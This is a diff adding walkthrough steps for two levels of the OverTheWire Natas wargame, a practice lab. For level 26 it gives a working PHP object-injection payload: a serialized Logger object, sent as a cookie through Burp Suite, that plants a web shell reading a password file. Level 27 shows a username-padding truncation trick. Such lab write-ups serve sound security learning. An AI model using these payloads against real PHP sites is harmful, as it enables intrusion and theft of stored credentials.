@@ -606,14 +606,69 @@ Draw a line:
 
 Solution:
 Open "View sourcecode" in a new tab.
+Search Google for "php object injection".
+Read: https://www.owasp.org/index.php/PHP_Object_Injection
+Copy the 'Logger' class from the sourcecode.
 
+cat > 26owned.php
+<?php
+    
+    class Logger{
+        private $logFile;
+        private $initMsg;
+        private $exitMsg;
+      
+        function __construct($file){
+            // initialise variables
+            $this->initMsg="";
+            $this->exitMsg="<?php passthru('cat /etc/natas_webpass/natas27');?>";
+            $this->logFile = "img/owned.php";
+      
+            // write initial message
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$initMsg);
+            fclose($fd);
+        }                       
+      
+        function log($msg){
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$msg."\n");
+            fclose($fd);
+        }                       
+      
+        function __destruct(){
+            // write exit message
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$this->exitMsg);
+            fclose($fd);
+        }                       
+    }
+echo base64_encode(serialize(new Logger()));
+
+?>
+
+php 26owned.php
+Copy the new cookie.
+Set iceweasel to connect to the Internet via manual proxy. (127.0.0.1:8080)
+Open Burp Suite and go to the Proxy section with Intercept On.
+Type whatever you want on the fields in the website and hit Draw.
+Replace the 'drawing' cookie with our new cookie.
+Forward.
+We'll get an error, but it's fine. Browse to: http://natas26.natas.labs.overthewire.org/img/owned.php
 
 Level 27
 Goal:
-
+Username: 
+Password: 
 
 Solution:
-
+Open "View sourcecode" in a new tab.
+Search Google for "mysql_fetch_assoc".
+Read: https://dev.mysql.com/doc/apis-php/en/apis-php-function.mysql-fetch-assoc.html
+Open Python in a terminal.
+"natas28" + (" " * 69) + "owned"
+Copy the output (minus the quotes) and paste it in the Username field.
+Go back to the index page and enter natas28 in the Username field.
 
 Level 28
 Goal:
